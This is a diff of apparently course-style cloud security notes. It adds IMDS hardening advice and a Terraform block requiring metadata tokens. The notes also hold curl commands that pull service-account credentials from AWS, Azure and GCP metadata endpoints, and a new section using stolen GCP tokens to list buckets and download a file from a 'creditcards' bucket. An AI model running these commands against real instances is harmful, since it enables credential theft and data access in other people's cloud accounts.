@@ -28,7 +28,9 @@ Mitre ATT&CK Cloud matrix - https://attack.mitre.org/matrices/enterprise/cloud/
 
 ## Notes
 - VM Service accounts/Instance Metadata Service (IMDS) - EC2 - Instance profile, Azure - Managed identity, GCP - Service account
-- 
+- Turn off Metadata service if the application does not use it. Setting http-endpoint to disabled will turn off access to the IMDS’s HTTP endpoint. Access to Azure’s IMDS can be restricted using a network security rule. For GCP, you must explicitly turn off IMDS v0.1 and v1beta1 using the disable-legacy-endpoints directive. AWS enhances security by setting a metadata token's IP packet TTL to 1, ensuring it's not routed beyond the requesting EC2 instance.
+- Limit the IP hops token responses to 1 (AWS only) - 
+
 ##### AWS
 - Get security group ```curl –s "http://169.254.169.254/latest/meta-data/securitygroups/"```
 - List of security creds saved in AWS - ```http://169.254.169.254/latest/meta-data/iam/security-credentials/```
@@ -42,7 +44,18 @@ $ export AWS_SESSION_TOKEN="IQoJb3JpZjEJ...3QtMSJEQCIykQYitLv8Vg=="
 
 $ aws s3api list-buckets
 ```
-
+- Turning off the AWS IMDSv1 endpoint, requiring tokens and setting the hop limit:
+```
+resource "aws_instance" "sec510" {
+  ami = data.aws_ami.ubuntu.id
+  instance_type = "t2.micro"
+  metadata_options {
+    http_endpoint = "enabled"
+    http_tokens = "required"
+    http_put_response_hop_limit = 1
+  }
+}
+```
 ##### Azure 
 - JWT for accessing the storage service ```curl "http://169.254.169.254/metadata/identity/oauth2/token?apiversion=2018-02-01&resource=https://storage.azure.com/" -H "Metadata: true"```
 - Azure authentication using stolen credentials
@@ -58,4 +71,11 @@ curl -s -H "Authorization: Bearer $BEARER_TOKEN" -H "x-ms-version:2017-11-09" "h
 - Get access token (beta, might not work) ```curl "http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token"```
 - Get service token ```curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/serviceaccounts/default/token```
 - Get the scope of service token - ```http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes```
-- 
+- GCP AUTH with stolen creds
+```
+$ export BEARER_TOKEN=ya29.c.Km7HBzaPr3J...WPBCgyiwPr5JESV16SHoh2w
+# List all storage buckets in the GCP project
+$ curl -s -H "Authorization: Bearer $BEARER _TOKEN" "https://storage.googleapis.com/storage/v1/b?project=sec510"
+# Download an object from the bucket.
+$ curl -s -H "Authorization: Bearer $BEARER_TOKEN" "https://www.googleapis.com/storage/v1/b/creditcards/o/alice.txt?alt=media" --output ~/tmp/alice.txt
+```
